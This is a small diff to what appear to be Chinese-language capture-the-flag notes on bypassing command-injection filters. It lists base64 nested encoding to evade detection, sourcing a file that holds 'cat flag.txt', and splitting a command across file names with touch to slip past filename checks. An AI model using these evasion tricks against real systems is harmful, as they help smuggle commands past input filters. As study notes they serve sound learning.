@@ -34,3 +34,5 @@ base64嵌套编码绕过:将目录编码绕过检测,嵌套解码后读取
     ls "cat flag.txt">123.txt
     source ./123,txt
 2.(防止对文件名检测,分开写入)
+    touch "ca\\"
+    touch "t flag.txt"
